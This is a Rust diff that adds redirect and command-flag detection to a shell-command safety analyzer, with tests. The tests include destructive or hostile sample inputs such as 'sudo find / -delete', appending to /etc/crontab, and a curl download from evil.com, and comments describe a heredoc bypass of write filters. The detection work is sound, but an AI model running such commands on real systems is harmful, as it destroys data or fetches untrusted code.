@@ -111,6 +111,13 @@ pub struct CommandAnalysis {
     /// Even if we extracted a head, errors suggest the command may have
     /// obfuscation attempts.
     pub had_parse_errors: bool,
+    /// S2: Security warnings detected by `check_redirects` — e.g. file
+    /// redirects to paths other than `/dev/null` that bypass the patch_file
+    /// workflow. Empty if no issues found.
+    pub redirect_warnings: Vec<String>,
+    /// S3: Security warnings detected by per-command shape rules — e.g.
+    /// `find -delete`, `curl -O`, `sed -i`, `tail -f` without a count, etc.
+    pub shape_warnings: Vec<String>,
 }
 
 /// Parse a command string and extract its canonical command head.
@@ -138,6 +145,8 @@ pub fn analyze_command(command: &str) -> CommandAnalysis {
             return CommandAnalysis {
                 canonical_head: None,
                 had_parse_errors: true,
+                redirect_warnings: vec![],
+                shape_warnings: vec![],
             }
         }
     };
@@ -148,6 +157,8 @@ pub fn analyze_command(command: &str) -> CommandAnalysis {
             return CommandAnalysis {
                 canonical_head: None,
                 had_parse_errors: true,
+                redirect_warnings: vec![],
+                shape_warnings: vec![],
             }
         }
     };
@@ -158,9 +169,17 @@ pub fn analyze_command(command: &str) -> CommandAnalysis {
     // Walk the top-level to find the first executable command.
     let head = find_first_command_head(&root, source);
 
+    // S2: Check for dangerous file redirects in the AST subtree
+    let redirect_warnings = check_all_redirects(&root, source);
+
+    // S3: Check per-command shape rules (find -delete, curl -O, sed -i, etc.)
+    let shape_warnings = check_command_shapes(&root, source);
+
     CommandAnalysis {
         canonical_head: head,
         had_parse_errors: had_errors,
+        redirect_warnings,
+        shape_warnings,
     }
 }
 
@@ -557,6 +576,336 @@ fn normalize_name(name: &str) -> String {
     basename
 }
 
+// ── S2: Recursive file redirect detection ────────────────────────────────────
+
+/// S2: Recursively scan the entire AST subtree for `file_redirect` nodes that
+/// write to paths other than `/dev/null` or fd duplicates.
+///
+/// tree-sitter-bash nests the `file_redirect` of `cmd <<EOF > /path` INSIDE
+/// the `heredoc_redirect` node — a direct-children scan would skip that write
+/// (the heredoc bypass: `echo x <<EOF > /etc/...` reaches the filesystem
+/// without detection). Recursing the whole subtree catches every nested
+/// redirect regardless of depth.
+///
+/// Returns a list of warning strings for each dangerous redirect found.
+fn check_all_redirects(root: &Node, source: &[u8]) -> Vec<String> {
+    let mut warnings = Vec::new();
+    check_redirects_recursive(root, source, &mut warnings);
+    warnings
+}
+
+/// Recursive helper — walks all descendants of `node` looking for
+/// `file_redirect` nodes with output (`>`) destinations.
+fn check_redirects_recursive(node: &Node, source: &[u8], warnings: &mut Vec<String>) {
+    if node.kind() == "file_redirect" {
+        check_one_file_redirect(node, source, warnings);
+    }
+
+    // Recurse into all children — create a fresh cursor for each level
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        check_redirects_recursive(&child, source, warnings);
+    }
+}
+
+/// Check a single `file_redirect` node: if it's an output redirect (`>`, `>>`,
+/// `&>`, `<>`, `N>`) whose destination is not `/dev/null` and not an fd
+/// duplicate, emit a warning.
+fn check_one_file_redirect(r: &Node, source: &[u8], warnings: &mut Vec<String>) {
+    let dest_opt = r.child_by_field_name("destination");
+
+    // file_redirect text looks like "> /tmp/x" / "<file" / "2>&1" / "&> out".
+    // No `>` -> pure input redirect (`<`, `0<`, `N<`), not a file write — skip.
+    let r_text = match r.utf8_text(source) {
+        Ok(t) => t,
+        Err(_) => return,
+    };
+    if !r_text.contains('>') {
+        return;
+    }
+
+    let dest = match dest_opt {
+        Some(d) => d,
+        None => return,
+    };
+
+    // destination kind == number -> fd duplicate (2>&1 / 1>&2), not a file write.
+    if dest.kind() == "number" {
+        return;
+    }
+
+    // Destination may be quoted — normalize (strip outer quotes) before comparing.
+    let dest_raw = match dest.utf8_text(source) {
+        Ok(t) => t,
+        Err(_) => return,
+    };
+    let dest_norm = strip_quotes(dest_raw);
+
+    if dest_norm == "/dev/null" {
+        return;
+    }
+
+    warnings.push(format!(
+        "redirect to '{dest_norm}' (file write bypasses patch_file; only /dev/null is allowed)"
+    ));
+}
+
+// ── S3: Per-command shape rules ──────────────────────────────────────────────
+
+/// Commands that require at least two consecutive numeric arguments
+/// (interval + count) to prevent unbounded loops.
+const COUNTED_LOOP_COMMANDS: &[&str] = &["vmstat", "iostat", "mpstat", "sar", "pidstat", "dstat"];
+
+/// S3: Check per-command shape rules — detect dangerous flags and patterns
+/// that bypass normal sanitization.
+///
+/// Returns a list of warning strings for each dangerous shape found.
+fn check_command_shapes(root: &Node, source: &[u8]) -> Vec<String> {
+    let mut warnings = Vec::new();
+
+    // Find all `command` nodes in the tree
+    let mut commands = Vec::new();
+    collect_all_commands(root, source, &mut commands);
+
+    for (_cmd_node, head, args) in &commands {
+        let head_lower = head.to_lowercase();
+        let normalized = normalize_name(&head_lower);
+
+        match normalized.as_str() {
+            "find" => check_find_shape(args, &mut warnings),
+            "curl" => check_curl_shape(args, &mut warnings),
+            "wget" => check_wget_shape(args, &mut warnings),
+            "sed" => check_sed_shape(args, &mut warnings),
+            "tail" | "gtail" => check_tail_shape(args, &mut warnings),
+            "touch" | "gtouch" => check_touch_shape(args, &mut warnings),
+            cmd if COUNTED_LOOP_COMMANDS.contains(&cmd) => {
+                check_counted_loop_shape(&normalized, args, &mut warnings);
+            }
+            _ => {}
+        }
+    }
+
+    warnings
+}
+
+/// Collect all `command` nodes with their head and arguments.
+fn collect_all_commands<'a>(
+    root: &Node<'a>,
+    source: &[u8],
+    out: &mut Vec<(Node<'a>, String, Vec<String>)>,
+) {
+    collect_commands_recursive(root, source, out);
+}
+
+fn collect_commands_recursive<'a>(
+    node: &Node<'a>,
+    source: &[u8],
+    out: &mut Vec<(Node<'a>, String, Vec<String>)>,
+) {
+    if node.kind() == "command" {
+        let words = collect_command_words(node, source);
+        if !words.is_empty() {
+            // Use extract_head_from_command which strips wrappers (sudo, env, etc.)
+            // and normalizes the head, so shape rules work through wrappers.
+            let head = extract_head_from_command(node, source)
+                .unwrap_or_else(|| normalize_name(&words[0]));
+            // Arguments: all words after the command name, skipping wrapper flags.
+            // For shape rules, we need the args of the real command, not the wrapper.
+            // extract_head_from_command already found the real head index internally,
+            // but doesn't expose it. As a simple heuristic, collect all non-wrapper
+            // args starting from the head position.
+            let wrapper_set: HashSet<&str> = WRAPPERS.iter().copied().collect();
+            let mut args = Vec::new();
+            let mut idx = 0;
+            let mut current_head = words[idx].to_lowercase();
+            // Skip wrappers the same way extract_head_from_command does (simplified)
+            while wrapper_set.contains(&current_head.as_str()) && idx + 1 < words.len() {
+                idx += 1;
+                // Skip wrapper flags
+                while idx < words.len() && words[idx].starts_with('-') {
+                    idx += 1;
+                }
+                if idx < words.len() {
+                    // For timeout, skip the duration
+                    if current_head == "timeout" && idx < words.len() {
+                        idx += 1; // skip duration
+                    }
+                    current_head = words[idx].to_lowercase();
+                }
+            }
+            // Collect remaining words as args
+            for i in idx + 1..words.len() {
+                args.push(words[i].clone());
+            }
+            out.push((*node, head, args));
+        }
+    }
+
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        collect_commands_recursive(&child, source, out);
+    }
+}
+
+/// `find -exec` / `-execdir` execute arbitrary commands per match, bypassing
+/// sanitization. `-delete` directly removes files.
+fn check_find_shape(args: &[String], warnings: &mut Vec<String>) {
+    for t in args {
+        match t.as_str() {
+            "-exec" | "-execdir" => {
+                warnings.push(format!(
+                    "find {t} (executes arbitrary command per match, bypasses sanitize)"
+                ));
+            }
+            "-delete" => {
+                warnings
+                    .push("find -delete (directly removes files without patch_file)".to_string());
+            }
+            _ => {}
+        }
+    }
+}
+
+/// `curl -O` / `--remote-name` writes URL basename to disk, bypassing redirect
+/// checks. `-o` / `--output` with a non-`/dev/null` path is also flagged.
+fn check_curl_shape(args: &[String], warnings: &mut Vec<String>) {
+    let mut prev_is_output = false;
+    for t in args {
+        if *t == "-O" || *t == "--remote-name" || *t == "--remote-name-all" {
+            warnings.push(format!(
+                "curl {t} (writes URL basename to disk; use stdout redirect instead)"
+            ));
+            continue;
+        }
+        if prev_is_output {
+            if *t != "/dev/null" && *t != "-" {
+                warnings.push(format!(
+                    "curl -o '{t}' (file write; only /dev/null or stdout allowed)"
+                ));
+            }
+            prev_is_output = false;
+            continue;
+        }
+        if *t == "-o" || *t == "--output" {
+            prev_is_output = true;
+            continue;
+        }
+        if let Some(path) = t.strip_prefix("--output=") {
+            if path != "/dev/null" && path != "-" {
+                warnings.push(format!(
+                    "curl --output={path} (file write; only /dev/null or stdout allowed)"
+                ));
+            }
+        }
+    }
+}
+
+/// `wget -O` / `--output-document` with a non-`/dev/null` path is flagged.
+fn check_wget_shape(args: &[String], warnings: &mut Vec<String>) {
+    let mut prev_is_output = false;
+    for t in args {
+        if prev_is_output {
+            if *t != "/dev/null" && *t != "-" {
+                warnings.push(format!(
+                    "wget -O '{t}' (file write; only /dev/null or stdout allowed)"
+                ));
+            }
+            prev_is_output = false;
+            continue;
+        }
+        if *t == "-O" || *t == "--output-document" {
+            prev_is_output = true;
+            continue;
+        }
+        if let Some(path) = t.strip_prefix("--output-document=") {
+            if path != "/dev/null" && path != "-" {
+                warnings.push(format!(
+                    "wget --output-document={path} (file write; only /dev/null or stdout allowed)"
+                ));
+            }
+        }
+    }
+}
+
+/// `sed -i` modifies files in-place without going through patch_file.
+fn check_sed_shape(args: &[String], warnings: &mut Vec<String>) {
+    for t in args {
+        if *t == "-i" || *t == "--in-place" {
+            warnings
+                .push("sed -i (in-place file modification; use patch_file workflow)".to_string());
+        }
+        // Handle `-i''` or `--in-place=` variants
+        if t.starts_with("--in-place=") {
+            warnings.push(
+                "sed --in-place= (in-place file modification; use patch_file workflow)".to_string(),
+            );
+        }
+        // Combined short flags like `-ibak` or `-i.bak`
+        if t.starts_with("-i") && t.len() > 2 && !t.starts_with("--") {
+            warnings.push(format!(
+                "sed {t} (in-place file modification; use patch_file workflow)"
+            ));
+        }
+    }
+}
+
+/// `tail -f` follows a file indefinitely (interactive blocking command).
+fn check_tail_shape(args: &[String], warnings: &mut Vec<String>) {
+    for t in args {
+        if *t == "-f" || *t == "--follow" {
+            warnings.push(
+                "tail -f (follows file indefinitely; interactive blocking command)".to_string(),
+            );
+        }
+        // Combined flags like `-fq`
+        if t.starts_with("-f") && t.len() > 2 && !t.starts_with("--") {
+            warnings.push(format!(
+                "tail {t} (follows file indefinitely; interactive blocking command)"
+            ));
+        }
+    }
+}
+
+/// `touch` with timestamp-modifying flags changes file metadata.
+fn check_touch_shape(args: &[String], warnings: &mut Vec<String>) {
+    for t in args {
+        let bad = matches!(
+            t.as_str(),
+            "-a" | "-m" | "-am" | "-ma" | "--date" | "--time" | "--reference"
+        ) || t.starts_with("-d")
+            || t.starts_with("-t")
+            || t.starts_with("-r")
+            || t.starts_with("--date=")
+            || t.starts_with("--time=")
+            || t.starts_with("--reference=");
+        if bad {
+            warnings.push(format!(
+                "touch {t} (timestamp change; touch may only create empty files)"
+            ));
+        }
+    }
+}
+
+/// Commands like `vmstat`, `iostat` need at least 2 consecutive numbers
+/// (interval + count) to prevent unbounded loops.
+fn check_counted_loop_shape(head: &str, args: &[String], warnings: &mut Vec<String>) {
+    let mut consecutive: u32 = 0;
+    let mut maxc: u32 = 0;
+    for t in args {
+        if t.parse::<u64>().is_ok() {
+            consecutive += 1;
+            maxc = maxc.max(consecutive);
+        } else {
+            consecutive = 0;
+        }
+    }
+    if maxc < 2 {
+        warnings.push(format!(
+            "{head} requires two consecutive numbers 'interval count' to prevent unbounded loop"
+        ));
+    }
+}
+
 /// Convenience function: extract just the canonical head, or `None` on failure.
 /// This is the main entry point for risk classification.
 pub fn canonical_head(command: &str) -> Option<String> {
@@ -759,5 +1108,297 @@ mod tests {
         // tree-sitter-bash may parse this as a function definition + command.
         // We just verify it doesn't crash.
         let _ = canonical_head(":(){ :|:& };:");
+    }
+
+    // ── S2: File redirect detection tests ─────────────────────────────────────
+
+    #[test]
+    fn s2_detects_simple_redirect_to_file() {
+        let analysis = analyze_command("echo hello > /tmp/pwned");
+        assert!(
+            analysis
+                .redirect_warnings
+                .iter()
+                .any(|w| w.contains("/tmp/pwned")),
+            "should detect redirect to /tmp/pwned, got: {:?}",
+            analysis.redirect_warnings
+        );
+    }
+
+    #[test]
+    fn s2_allows_redirect_to_dev_null() {
+        let analysis = analyze_command("echo hello > /dev/null");
+        assert!(
+            analysis.redirect_warnings.is_empty(),
+            "/dev/null redirect should be allowed, got: {:?}",
+            analysis.redirect_warnings
+        );
+    }
+
+    #[test]
+    fn s2_allows_fd_duplicate_redirect() {
+        let analysis = analyze_command("echo hello 2>&1");
+        assert!(
+            analysis.redirect_warnings.is_empty(),
+            "fd duplicate redirect should be allowed, got: {:?}",
+            analysis.redirect_warnings
+        );
+    }
+
+    #[test]
+    fn s2_detects_append_redirect() {
+        let analysis = analyze_command("echo data >> /etc/crontab");
+        assert!(
+            analysis
+                .redirect_warnings
+                .iter()
+                .any(|w| w.contains("/etc/crontab")),
+            "should detect append redirect to /etc/crontab"
+        );
+    }
+
+    #[test]
+    fn s2_detects_heredoc_bypass_redirect() {
+        // The heredoc bypass: `cmd <<EOF > /path` nests the file_redirect
+        // inside the heredoc_redirect node — only recursive scan catches it.
+        let analysis = analyze_command("cat <<EOF > /tmp/heredoc_bypass\nhello\nEOF");
+        assert!(
+            analysis
+                .redirect_warnings
+                .iter()
+                .any(|w| w.contains("/tmp/heredoc_bypass")),
+            "should detect redirect nested inside heredoc, got: {:?}",
+            analysis.redirect_warnings
+        );
+    }
+
+    #[test]
+    fn s2_allows_input_redirect() {
+        let analysis = analyze_command("cat < /etc/hosts");
+        assert!(
+            analysis.redirect_warnings.is_empty(),
+            "input redirect should be allowed, got: {:?}",
+            analysis.redirect_warnings
+        );
+    }
+
+    #[test]
+    fn s2_detects_redirect_in_pipeline() {
+        let analysis = analyze_command("echo hello | tee /tmp/teed > /tmp/dup");
+        assert!(
+            analysis
+                .redirect_warnings
+                .iter()
+                .any(|w| w.contains("/tmp/dup")),
+            "should detect redirect to /tmp/dup in pipeline, got: {:?}",
+            analysis.redirect_warnings
+        );
+    }
+
+    #[test]
+    fn s2_allows_quoted_dev_null() {
+        let analysis = analyze_command("echo hello > \"/dev/null\"");
+        assert!(
+            analysis.redirect_warnings.is_empty(),
+            "quoted /dev/null redirect should be allowed, got: {:?}",
+            analysis.redirect_warnings
+        );
+    }
+
+    // ── S3: Per-command shape rule tests ──────────────────────────────────────
+
+    #[test]
+    fn s3_find_exec_is_flagged() {
+        let analysis = analyze_command("find / -name '*.log' -exec rm {} \\;");
+        assert!(
+            analysis.shape_warnings.iter().any(|w| w.contains("-exec")),
+            "find -exec should be flagged, got: {:?}",
+            analysis.shape_warnings
+        );
+    }
+
+    #[test]
+    fn s3_find_delete_is_flagged() {
+        let analysis = analyze_command("find /tmp -name '*.tmp' -delete");
+        assert!(
+            analysis
+                .shape_warnings
+                .iter()
+                .any(|w| w.contains("-delete")),
+            "find -delete should be flagged"
+        );
+    }
+
+    #[test]
+    fn s3_find_name_only_not_flagged() {
+        let analysis = analyze_command("find /tmp -name '*.log' -print");
+        assert!(
+            analysis.shape_warnings.is_empty(),
+            "find -name/-print should not be flagged, got: {:?}",
+            analysis.shape_warnings
+        );
+    }
+
+    #[test]
+    fn s3_curl_remote_name_is_flagged() {
+        let analysis = analyze_command("curl -O https://example.com/file.tar.gz");
+        assert!(
+            analysis.shape_warnings.iter().any(|w| w.contains("-O")),
+            "curl -O should be flagged"
+        );
+    }
+
+    #[test]
+    fn s3_curl_output_to_dev_null_not_flagged() {
+        let analysis = analyze_command("curl -o /dev/null https://example.com/");
+        assert!(
+            analysis.shape_warnings.is_empty(),
+            "curl -o /dev/null should not be flagged, got: {:?}",
+            analysis.shape_warnings
+        );
+    }
+
+    #[test]
+    fn s3_curl_output_to_file_is_flagged() {
+        let analysis = analyze_command("curl -o /tmp/malware https://example.com/");
+        assert!(
+            analysis
+                .shape_warnings
+                .iter()
+                .any(|w| w.contains("/tmp/malware")),
+            "curl -o /tmp/malware should be flagged"
+        );
+    }
+
+    #[test]
+    fn s3_curl_output_equal_form_flagged() {
+        let analysis = analyze_command("curl --output=/tmp/file https://example.com/");
+        assert!(
+            analysis
+                .shape_warnings
+                .iter()
+                .any(|w| w.contains("/tmp/file")),
+            "curl --output=/tmp/file should be flagged"
+        );
+    }
+
+    #[test]
+    fn s3_wget_output_to_file_is_flagged() {
+        let analysis = analyze_command("wget -O /tmp/file https://example.com/");
+        assert!(
+            analysis
+                .shape_warnings
+                .iter()
+                .any(|w| w.contains("/tmp/file")),
+            "wget -O /tmp/file should be flagged"
+        );
+    }
+
+    #[test]
+    fn s3_sed_inplace_is_flagged() {
+        let analysis = analyze_command("sed -i 's/old/new/g' /etc/hosts");
+        assert!(
+            analysis.shape_warnings.iter().any(|w| w.contains("-i")),
+            "sed -i should be flagged"
+        );
+    }
+
+    #[test]
+    fn s3_sed_without_inplace_not_flagged() {
+        let analysis = analyze_command("sed 's/old/new/g' input.txt");
+        assert!(
+            analysis.shape_warnings.is_empty(),
+            "sed without -i should not be flagged, got: {:?}",
+            analysis.shape_warnings
+        );
+    }
+
+    #[test]
+    fn s3_tail_follow_is_flagged() {
+        let analysis = analyze_command("tail -f /var/log/syslog");
+        assert!(
+            analysis.shape_warnings.iter().any(|w| w.contains("-f")),
+            "tail -f should be flagged"
+        );
+    }
+
+    #[test]
+    fn s3_tail_without_follow_not_flagged() {
+        let analysis = analyze_command("tail -n 100 /var/log/syslog");
+        assert!(
+            analysis.shape_warnings.is_empty(),
+            "tail without -f should not be flagged, got: {:?}",
+            analysis.shape_warnings
+        );
+    }
+
+    #[test]
+    fn s3_touch_timestamp_flag_is_flagged() {
+        let analysis = analyze_command("touch -m -t 202401010000 /tmp/file");
+        assert!(
+            !analysis.shape_warnings.is_empty(),
+            "touch -m -t should be flagged, got: {:?}",
+            analysis.shape_warnings
+        );
+    }
+
+    #[test]
+    fn s3_touch_create_only_not_flagged() {
+        let analysis = analyze_command("touch /tmp/newfile");
+        assert!(
+            analysis.shape_warnings.is_empty(),
+            "touch without timestamp flags should not be flagged, got: {:?}",
+            analysis.shape_warnings
+        );
+    }
+
+    #[test]
+    fn s3_vmstat_without_count_is_flagged() {
+        let analysis = analyze_command("vmstat");
+        assert!(
+            analysis.shape_warnings.iter().any(|w| w.contains("vmstat")),
+            "vmstat without count should be flagged"
+        );
+    }
+
+    #[test]
+    fn s3_vmstat_with_count_not_flagged() {
+        let analysis = analyze_command("vmstat 1 5");
+        assert!(
+            analysis.shape_warnings.is_empty(),
+            "vmstat 1 5 should not be flagged, got: {:?}",
+            analysis.shape_warnings
+        );
+    }
+
+    #[test]
+    fn s3_iostat_without_count_is_flagged() {
+        let analysis = analyze_command("iostat");
+        assert!(
+            analysis.shape_warnings.iter().any(|w| w.contains("iostat")),
+            "iostat without count should be flagged"
+        );
+    }
+
+    #[test]
+    fn s3_shape_rules_work_through_sudo() {
+        let analysis = analyze_command("sudo find / -delete");
+        assert!(
+            analysis
+                .shape_warnings
+                .iter()
+                .any(|w| w.contains("-delete")),
+            "find -delete through sudo should be flagged"
+        );
+    }
+
+    #[test]
+    fn s3_multiple_warnings_collected() {
+        let analysis = analyze_command("find / -delete && curl -O https://evil.com/x");
+        assert!(
+            analysis.shape_warnings.len() >= 2,
+            "should collect multiple warnings, got: {:?}",
+            analysis.shape_warnings
+        );
     }
 }
